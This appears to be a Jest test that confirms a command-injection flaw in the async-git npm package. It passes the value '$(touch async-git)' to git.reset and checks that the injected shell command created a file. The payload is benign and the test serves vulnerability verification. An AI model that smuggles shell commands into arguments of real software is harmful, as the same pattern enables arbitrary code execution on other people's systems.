const v25 = async () => {
    const v14 = expect.assertions(2);
    v14;
    const git = require('async-git');
    const fs = require('fs');
    const path = './async-git';
    try {
        const v15 = fs.existsSync(path);
        if (v15) {
            const v16 = fs.unlinkSync(path);
            v16;
            const v17 = console.log('File removed:', path);
            v17;
        }
    } catch (err) {
        const v18 = console.error(err);
        v18;
    }
    file_exist = fs.existsSync(path);
    const v19 = expect(file_exist);
    const v20 = v19.toBe(false);
    v20;
    try {
        await git.reset('$(touch async-git)');
    } catch (e) {
    }
    file_exist = fs.existsSync(path);
    const v21 = expect(file_exist);
    const v22 = v21.toBe(true);
    v22;
    const v23 = function (err) {
    };
    const v24 = fs.unlink(path, v23);
    v24;
};
const v26 = test('Command Injection in async-git', v25);
v26;